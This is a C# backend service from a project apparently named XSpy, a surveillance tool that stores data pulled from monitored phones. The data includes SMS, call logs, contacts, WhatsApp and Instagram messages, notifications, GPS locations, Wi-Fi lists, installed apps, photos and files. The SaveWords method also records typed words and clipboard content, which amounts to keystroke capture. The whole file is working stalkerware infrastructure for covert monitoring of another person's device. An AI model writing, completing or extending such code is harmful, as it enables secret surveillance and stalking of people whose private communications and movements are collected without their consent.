﻿using System;
using System.Collections.Generic;
using System.Globalization;
using Microsoft.EntityFrameworkCore;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Extensions.Caching.Distributed;
using Microsoft.Extensions.Caching.Memory;
using XSpy.Database.Entities;
using XSpy.Database.Entities.Devices;
using XSpy.Database.Models;
using XSpy.Database.Models.Requests.Devices.Data;
using XSpy.Database.Models.Requests.Devices.Data.Send;
using XSpy.Database.Models.Requests.Devices.Search;
using XSpy.Database.Models.Responses;
using XSpy.Database.Models.Responses.Devices.Search;
using XSpy.Database.Models.Tables;
using XSpy.Database.Models.Views;
using XSpy.Database.Services.Base;
using File = XSpy.Database.Entities.Devices.File;

namespace XSpy.Database.Services
{
    public class DeviceService : BaseEntityService
    {
        public DeviceService(DatabaseContext context, IMemoryCache cache) : base(context, cache)
        {
        }

        public async Task<DeviceMenuViewModel> GetDashboardInfo(Guid deviceId)
        {
            var device =await DbContext.Devices.FirstOrDefaultAsync(s => s.Id == deviceId);
            if (device == null)
                return null;

            var sms = await DbContext.Messages.Where(s => s.DeviceId == deviceId).LongCountAsync();
            var words = await DbContext.Clipboards.Where(s => s.DeviceId == deviceId).LongCountAsync();
            var files = await DbContext.Files.Where(s => s.DeviceId == deviceId && s.FileType != "audio")
                .LongCountAsync();
            var audios = await DbContext.Files.Where(s => s.DeviceId == deviceId && s.FileType == "audio")
                .LongCountAsync();
            var contacts = await DbContext.Contacts.Where(s => s.DeviceId == deviceId).LongCountAsync();
            var calls = await DbContext.Calls.Where(s => s.DeviceId == deviceId).LongCountAsync();
            var locations = await DbContext.Locations.Where(s => s.DeviceId == deviceId).LongCountAsync();
            var images = await DbContext.ImageList.Where(s => s.DeviceId == deviceId).LongCountAsync();
            var wifi = await DbContext.WifiList.Where(s => s.DeviceId == deviceId).LongCountAsync();
            var whatsapp = await DbContext.AppMessages
                .Where(s => s.DeviceId == deviceId && s.AppType == AppType.WhatsApp).LongCountAsync();

            var insta = await DbContext.AppMessages
                .Where(s => s.DeviceId == deviceId && s.AppType == AppType.Instagram).LongCountAsync();

            return new DeviceMenuViewModel()
            {
                Files = files,
                Messages = sms,
                Words = words,
                Audios = audios,
                Instagram = insta,
                Contacts = contacts,
                Calls = calls,
                Locations = locations,
                Photos = images,
                WhatsApp = whatsapp,
                WifiCount = wifi,
                Device = device
            };
        }

        public async Task<DataTableResponse<DeviceListResponse>> GetTable(DataTableRequest<SearchDeviceRequest> request,
            User user)
        {
            var query = DbContext.Devices.AsQueryable();

            var countTotal = await query.LongCountAsync();


            if (request.Filter != null)
            {
                if (!string.IsNullOrEmpty(request.Filter.Model))
                {
                    query = query.Where(s => s.Model.ToUpper().Contains(request.Filter.Model.ToUpper()));
                }
            }

            if (request.Search != null && !string.IsNullOrEmpty(request.Search.Value))
            {
                var search = request.Search.Value.ToUpper();
                query = query.Where(s =>
                    s.Model.ToUpper().Contains(search) || s.Manufacturer.ToUpper().Contains(search) ||
                    s.DeviceId.ToUpper().Contains(search));
            }

            query = query.Where(s => s.UserId == user.Id);

            var queryData = query.Select(s => new DeviceListResponse()
            {
                Id = s.Id,
                Model = s.Model,
                DeviceId = s.DeviceId,
                IsActive = s.IsOnline,
                LastUpdate = s.UpdatedAt
            });

            queryData = OrderResult(queryData, request);
            var total = await queryData.LongCountAsync();
            queryData = queryData.ApplyTableLimit(request);

            return new DataTableResponse<DeviceListResponse>()
            {
                Data = await queryData.ToListAsync(),
                Draw = request.Draw,
                RecordsFiltered = total,
                RecordsTotal = countTotal
            };
        }

        public Task<List<AppContact>> GetAppContacts(Device device, AppType appType)
        {
            return DbContext.AppContacts.Where(s => s.AppType == appType && s.DeviceId == device.Id).ToListAsync();
        }

        public async Task Delete(Device device)
        {
            DbContext.Devices.Remove(device);
            await DbContext.SaveChangesAsync();
        }

        public Task<Device> GetDeviceById(Guid id, Guid userId)
        {
            return DbContext.Devices.FirstOrDefaultAsync(s => s.Id == id && s.UserId == userId);
        }

        public Task<List<Device>> GetDevicesForUser(Guid userId)
        {
            return DbContext.Devices.Where(s => s.UserId == userId).Select(s => new Device()
            {
                Id = s.Id,
                Model = s.Model,
                Manufacturer = s.Manufacturer,
                IsOnline = s.IsOnline,
                SystemVersion = s.SystemVersion,
                UpdatedAt = s.UpdatedAt
            }).OrderByDescending(s => s.UpdatedAt).ToListAsync();
        }

        public Task<List<TempPath>> GetPathsForDevice(Guid id)
        {
            return DbContext.TempPaths.Where(s => s.DeviceId == id).Select(s => new TempPath()
            {
                CanRead = s.CanRead,
                Name = s.Name,
                IsDir = s.IsDir,
                Parent = s.Parent,
                Path = s.Path
            }).ToListAsync();
        }

        public Task<Location> GetLatestLocation(Guid deviceId)
        {
            return DbContext.Locations.OrderByDescending(s => s.CratedAt)
                .FirstOrDefaultAsync(s => s.DeviceId == deviceId);
        }

        public async Task DisconnectDevice(string deviceId)
        {
            var device = await DbContext.Devices.Where(s => s.DeviceId == deviceId).FirstOrDefaultAsync();
            device.IsOnline = false;
            DbContext.Update(device);
            await DbContext.SaveChangesAsync();
        }

        public Task<long> GetDeviceCount(Guid userId, SaveDeviceRequest request)
        {
            return DbContext.Devices.Where(s => s.UserId == userId && s.DeviceId != request.DeviceId)
                .LongCountAsync();
        }

        public async Task SaveDevice(Guid userId, SaveDeviceRequest request)
        {
            var device =
                await DbContext.Devices.FirstOrDefaultAsync(s => s.DeviceId == request.DeviceId && s.UserId == userId);
            if (device == null)
            {
                device = new Device()
                {
                    Id = Guid.NewGuid(),
                    AddedAt = DateTime.Now,
                    DeviceId = request.DeviceId,
                    LastIp = request.IpAddress,
                    Manufacturer = request.Manufacturer,
                    Model = request.Model,
                    SystemVersion = request.Release,
                    UpdatedAt = DateTime.Now,
                    UserId = userId,
                    IsOnline = true
                };

                await DbContext.Devices.AddAsync(device);
            }
            else
            {
                device.LastIp = request.IpAddress;
                device.IsOnline = true;
                device.UpdatedAt = DateTime.Now;
                DbContext.Update(device);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task SaveCalls(string deviceId, SaveCallsRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            foreach (var dataRequest in request.CallsList)
            {
                var hash = CalculateMd5(
                    dataRequest.Name + dataRequest.PhoneNo + dataRequest.Date + dataRequest.Duration);

                if (await DbContext.Calls.AnyAsync(s => s.Hash == hash))
                {
                    continue;
                }

                await DbContext.Calls.AddAsync(new Call()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device,
                    Name = dataRequest.Name,
                    Number = dataRequest.PhoneNo,
                    Hash = hash,
                    Date = JavaTimeStampToDateTime(dataRequest.Date),
                    Duration = dataRequest.Duration,
                    Type = dataRequest.Type
                });
            }


            await DbContext.SaveChangesAsync();
        }

        public async Task ListPath(string deviceId, List<LoadPathData> paths)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId)
                    .FirstOrDefaultAsync();
            if (device.Id == Guid.Empty)
                return;

            device.IsLoadingDir = false;
            DbContext.Update(device);

            DbContext.TempPaths.RemoveRange(DbContext.TempPaths.Where(s => s.DeviceId == device.Id));
            foreach (var pathData in paths)
            {
                var data = new TempPath()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device.Id,
                    CanRead = pathData.CanRead,
                    IsDir = pathData.IsDir,
                    Name = pathData.Name,
                    Path = pathData.Path,
                    Parent = pathData.Parent
                };

                await DbContext.AddAsync(data);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task SaveImageThumb(string deviceId, string thumbUrl, string imagePath)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId)
                    .Select(s => s.Id)
                    .FirstOrDefaultAsync();
            if (device == Guid.Empty)
                return;

            var imageFile =
                await DbContext.ImageList.FirstOrDefaultAsync(s => s.OriginalPath == imagePath && s.DeviceId == device);
            if (imageFile != null)
            {
                imageFile.ThumbPath = thumbUrl;
                DbContext.ImageList.Update(imageFile);
                await DbContext.SaveChangesAsync();
            }
        }


        public async Task<List<SaveGalleryRequest>> ImageList(string deviceId, List<SaveGalleryRequest> paths)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId)
                    .FirstOrDefaultAsync();
            if (device.Id == Guid.Empty)
                return new List<SaveGalleryRequest>(0);

            device.IsLoadingDir = false;
            DbContext.Update(device);

            var needThumb = new List<SaveGalleryRequest>();

            foreach (var pathData in paths)
            {
                var exits = await DbContext.ImageList.Where(s =>
                        s.OriginalPath == pathData.Path && s.DeviceId == device.Id)
                    .Select(s => new {s.Id, s.ThumbPath}).FirstOrDefaultAsync();
                if (exits != null)
                {
                    if (string.IsNullOrEmpty(exits.ThumbPath))
                    {
                        needThumb.Add(pathData);
                    }

                    continue;
                }

                if (await DbContext.ImageList.AnyAsync(s => s.OriginalPath == pathData.Path && s.DeviceId == device.Id))
                    continue;

                var data = new FileList()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device.Id,
                    OriginalPath = pathData.Path,
                    FileId = pathData.ImageId
                };

                needThumb.Add(pathData);

                await DbContext.AddAsync(data);
            }

            await DbContext.SaveChangesAsync();

            return needThumb;
        }

        public async Task StoreMessages(string deviceId, List<ListSmsData> listSms)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();
            if (device == Guid.Empty)
                return;

            foreach (var smsData in listSms)
            {
                var date = JavaTimeStampToDateTime(smsData.Date);
                var hash = CalculateMd5(
                    smsData.Address + date + smsData.Type);

                if (await DbContext.Messages.AnyAsync(s => s.Hash == hash))
                {
                    continue;
                }

                var smsEntry = new Sms()
                {
                    Id = Guid.NewGuid(),
                    DeviceId = device,
                    Address = smsData.Address,
                    CratedAt = DateTime.Now,
                    Body = smsData.Body,
                    Hash = hash,
                    Date = date,
                    IsRead = smsData.Read == "true" || smsData.Read == "1",
                    Type = (CallType) smsData.Type
                };
                await DbContext.Messages.AddAsync(smsEntry);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task<File> StoreFile(string deviceId, string savePath, TransferFileRequest transferFile)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();
            if (device == Guid.Empty)
                return null;

            var fileExists =
                await DbContext.Files.FirstOrDefaultAsync(s =>
                    s.DeviceId == device && s.OriginalPath == transferFile.Path);
            if (fileExists != null)
            {
                return fileExists;
            }

            var file = new File()
            {
                Id = Guid.NewGuid(),
                CratedAt = DateTime.Now,
                DeviceId = device,
                OriginalName = transferFile.Name,
                OriginalPath = transferFile.Path,
                FileType = transferFile.Type,
                SavedPath = savePath
            };

            await DbContext.Files.AddAsync(file);
            await DbContext.SaveChangesAsync();
            return file;
        }

        private DayOfWeek GetDayOfWeek(string day)
        {
            switch (day)
            {
                case "mon":
                case "seg":
                    return DayOfWeek.Monday;
                case "ter":
                case "tue":
                    return DayOfWeek.Tuesday;
                case "qua":
                case "wed":
                    return DayOfWeek.Wednesday;
                case "qui":
                case "thu":
                    return DayOfWeek.Thursday;
                case "sex":
                case "fri":
                    return DayOfWeek.Friday;
                case "sat":
                case "sáb":
                    return DayOfWeek.Saturday;
                case "sun":
                case "dom":
                    return DayOfWeek.Sunday;
            }

            return DateTime.Now.DayOfWeek;
        }

        private DateTime GetAppMessageDate(AppType appType, string date)
        {
            var day = date[..3].ToLower();

            switch (appType)
            {
                case AppType.WhatsApp:
                    switch (day)
                    {
                        case "tod":
                        case "hoj":
                            return DateTime.Today;
                        case "yes":
                        case "ont":
                            return DateTime.Today.Subtract(TimeSpan.FromDays(1));
                    }

                    break;
                case AppType.Instagram:
                {
                    switch (day)
                    {
                        case "tod":
                        case "hoj":
                            return DateTime.Today;
                        case "yes":
                        case "ont":
                            return DateTime.Today.Subtract(TimeSpan.FromDays(1));
                        default:
                            if (date.Contains("."))
                            {
                                day = date.Remove(date.Length - 6, 6);

                                if (day.Contains("de "))
                                {
                                    day = day.Replace("de ", null);
                                }

                                return DateTime.Parse(day);
                            }

                            var dayOfWeek = GetDayOfWeek(day);
                            return DateTime.Now.StartOfWeek(dayOfWeek);
                    }
                }
            }

            return DateTime.Parse(date);
        }

        public async Task<AppContact> StoreAppMessages(string deviceId, List<SaveAppMessageRequest> messages,
            AppType appType,
            string contactName)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();
            if (device == Guid.Empty)
                return null;

            var contact = await
                DbContext.AppContacts.FirstOrDefaultAsync(s => s.AppType == appType && s.ContactName == contactName
                    && s.DeviceId == device
                );
            if (contact == null)
            {
                contact = new AppContact()
                {
                    Id = Guid.NewGuid(),
                    DeviceId = device,
                    AppType = appType,
                    ContactName = contactName,
                    CratedAt = DateTime.Now
                };

                await DbContext.AppContacts.AddAsync(contact);
                await DbContext.SaveChangesAsync();
            }

            messages.Reverse(0, messages.Count);

            foreach (var messageRequest in messages)
            {
                DateTime date = GetAppMessageDate(appType, messageRequest.Date);

                if (messageRequest.Time.Contains("AM") || messageRequest.Time.Contains("PM"))
                {
                    if (messageRequest.Time.Length <= 7)
                    {
                        messageRequest.Time = "0" + messageRequest.Time;
                    }
                }

                var time = DateTime.Parse(messageRequest.Time);


                var dateTime = DateTime.ParseExact(date.ToString("dd/MM/yyyy " + time.ToString("HH:mm:ss")),
                    "dd/MM/yyyy HH:mm:ss", null);

                if (await DbContext.AppMessages.AnyAsync(s =>
                    s.Body == messageRequest.Message && s.MessageDate == dateTime && s.IsOwn == messageRequest.IsOwn))
                    continue;

                var msg = new AppMessage()
                {
                    Id = Guid.NewGuid(),
                    DeviceId = device,
                    AppType = appType,
                    ContactId = contact.Id,
                    Body = messageRequest.Message,
                    CratedAt = DateTime.Now,
                    MessageDate = dateTime,
                    IsOwn = messageRequest.IsOwn
                };

                if (messageRequest.Message.Length > 12)
                {
                    messageRequest.Message = messageRequest.Message.Substring(0, 8) + "...";
                }

                contact.LastMessage = messageRequest.Message;
                contact.LastMessageDate = dateTime;

                await DbContext.AppMessages.AddAsync(msg);
            }

            DbContext.AppContacts.Update(contact);

            await DbContext.SaveChangesAsync();

            return contact;
        }

        public async Task SaveContacts(string deviceId, SaveContactsRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            foreach (var dataRequest in request.ContactsList)
            {
                var hash = CalculateMd5(dataRequest.Name + dataRequest.PhoneNo + dataRequest.PhoneId);

                if (await DbContext.Contacts.AnyAsync(s => s.Hash == hash))
                {
                    continue;
                }

                await DbContext.Contacts.AddAsync(new Contact()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device,
                    ContactName = dataRequest.Name,
                    Number = dataRequest.PhoneNo,
                    Hash = hash,
                    PhoneId = dataRequest.PhoneId
                });
            }


            await DbContext.SaveChangesAsync();
        }

        public async Task SaveNotification(string deviceId, SaveNotificationsData dataRequest)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            var checkNotify = await
                DbContext.Notifications.AnyAsync(s =>
                    s.DeviceId == device && s.Date == DateTime.Now && s.Content == dataRequest.Content &&
                    s.Title == dataRequest.Title);

            if (checkNotify)
                return;

            await DbContext.Notifications.AddAsync(new Notification()
            {
                Id = Guid.NewGuid(),
                CratedAt = DateTime.Now,
                DeviceId = device,
                Content = dataRequest.Content,
                Date = JavaTimeStampToDateTime(dataRequest.PostTime),
                Key = dataRequest.Key,
                AppName = dataRequest.AppName,
                Title = dataRequest.Title
            });


            await DbContext.SaveChangesAsync();
        }

        public async Task SavePermission(string deviceId, PermissionDataRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            var permission =
                await DbContext.Permissions.FirstOrDefaultAsync(s => s.DeviceId == device && s.Key == request.Perm);
            if (permission == null)
            {
                permission = new Permission()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device,
                    Key = request.Perm,
                    IsAllowed = request.IsAllowed
                };
                await DbContext.AddAsync(permission);
            }
            else
            {
                DbContext.Update(permission);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task SavePermission(string deviceId, GrantedPermissionRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            DbContext.Permissions.RemoveRange(DbContext.Permissions.Where(s => s.DeviceId == device));

            foreach (var requestPermission in request.Permissions)
            {
                var permission = new Permission()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device,
                    Key = requestPermission,
                    IsAllowed = true
                };

                await DbContext.AddAsync(permission);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task SaveWifi(string deviceId, SaveWifiList request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            DbContext.WifiList.RemoveRange(DbContext.WifiList.Where(s => s.DeviceId == device));

            foreach (var requestNetwork in request.Networks)
            {
                var entry = new Wifi()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device,
                    Bssid = requestNetwork.BSSID,
                    Ssid = requestNetwork.SSID
                };

                await DbContext.AddAsync(entry);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task SaveInstalledList(string deviceId, SaveInstalledAppsRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            foreach (var installedApp in request.Apps)
            {
                if (await DbContext.InstalledApps.AnyAsync(s =>
                    s.DeviceId == device && s.PackageName == installedApp.PackageName))
                    continue;

                var app = new InstalledApps()
                {
                    CratedAt = JavaTimeStampToDateTime(installedApp.InstallDate),
                    AppName = installedApp.AppName,
                    DeviceId = device,
                    Id = Guid.NewGuid(),
                    PackageName = installedApp.PackageName,
                    VersionCode = installedApp.VersionCode,
                    VersionName = installedApp.VersionName
                };
                await DbContext.InstalledApps.AddAsync(app);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task SaveLocation(string deviceId, UpdatePositionRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();
            if (device == Guid.Empty)
                return;

            var loc = new Location()
            {
                Id = Guid.NewGuid(),
                DeviceId = device,
                Accuracy = request.Accuracy,
                Altitude = request.Altitude,
                CratedAt = DateTime.Now,
                Enabled = request.Enabled,
                Latitude = request.Latitude,
                Longitude = request.Longitude,
                Speed = request.Speed
            };

            await DbContext.Locations.AddAsync(loc);
            await DbContext.SaveChangesAsync();
        }

        public async Task SaveWords(string deviceId, string word, string appName, bool isClipboard)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();
            if (device == Guid.Empty)
                return;

            var lastWord = await
                DbContext.Clipboards.Where(s => !s.IsClipboard && s.DeviceId == device)
                    .OrderByDescending(s => s.CratedAt).FirstOrDefaultAsync();
            if (lastWord != null && lastWord.CratedAt.AddMinutes(2) >= DateTime.Now &&
                word.StartsWith(lastWord.Content))
            {
                lastWord.Content = word;
                lastWord.CratedAt = DateTime.Now;

                DbContext.Clipboards.Update(lastWord);
            }
            else
            {
                var clip = new Clipboard()
                {
                    Id = Guid.NewGuid(),
                    DeviceId = device,
                    CratedAt = DateTime.Now,
                    AppName = appName,
                    Content = word,
                    IsClipboard = isClipboard
                };

                await DbContext.Clipboards.AddAsync(clip);
            }

            await DbContext.SaveChangesAsync();
        }

        public Task<Device> GetDeviceByDeviceId(Guid userId, string deviceId)
        {
            return DbContext.Devices.FirstOrDefaultAsync(s => s.DeviceId == deviceId && s.UserId == userId);
        }
    }
}